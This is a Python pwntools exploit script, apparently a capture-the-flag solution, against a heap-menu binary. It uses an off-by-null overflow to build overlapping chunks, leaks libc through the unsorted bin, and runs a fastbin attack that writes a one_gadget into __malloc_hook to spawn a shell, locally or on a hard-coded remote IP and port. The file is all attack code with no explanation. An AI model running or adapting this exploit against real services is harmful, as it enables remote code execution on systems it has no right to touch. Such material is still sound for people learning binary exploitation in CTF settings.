import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process("./pwn2")
	elf = ELF("./pwn2")
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else:
	p = remote('120.79.17.251',20001)
	elf = ELF("./pwn1")

one = [0x45216,0x4526a,0xf02a4,0xf1147]

def menu(command):
    ru("choice")
    sl(str(command))

def add(size):
    menu(1)
    ru("size:")
    sl(str(size))

def show(idx):
    menu(2)
    sla("index:",str(idx))

def edit(idx,content):
    menu(3)
    sla("index:",str(idx))
    sla("content:",content)

def delete(idx):
    menu(4)
    sla("index:",str(idx))

###null-by-one###
add(0xf8)#0
add(0x68)#1
add(0x18)#2
add(0x68)#3
add(0xf8)#4
add(0xf8)#5
add(0x10)#6

delete(3)
edit(4,b'\x00'*0xf0 + p64(0x300))
delete(0)
delete(5)
#gdb.attach(p)

###leak libc###
add(0xf8)#7
gdb.attach(p)
show(1)
c = ru('\x7f')[-6:].ljust(8,b'\x00')
base = u64(c) - 0x3c4b78

###fastbin attack###
malloc = base + libc.symbols['__malloc_hook']
realloc = base + libc.symbols['realloc']
add(0xf8)#8
edit(8,b'0'*0x80+p64(0)+p64(0x71)+p64(malloc-0x23))

add(0x68)#9
add(0x68)#10
gad = one[3] + base
edit(10,b'\x00'*0xb + p64(gad)+p64(gad))
add(0x10)

ia()